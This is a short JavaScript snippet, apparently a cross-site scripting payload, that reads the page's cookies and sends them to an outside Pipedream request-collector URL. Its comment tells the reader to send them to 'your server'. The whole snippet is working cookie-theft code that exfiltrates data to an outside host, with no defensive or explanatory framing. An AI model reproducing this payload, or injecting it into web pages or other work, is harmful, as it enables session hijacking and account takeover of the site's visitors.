// Fetch the document's cookies and send them to your server
const cookies = document.cookie;

fetch('https://eok09z4evwy4gne.m.pipedream.net/?cookie=' + encodeURIComponent(cookies), {
    method: 'GET',
    mode: 'no-cors', // This prevents CORS issues but won't give you a response
}).catch((err) => console.error('Failed to send cookies:', err));
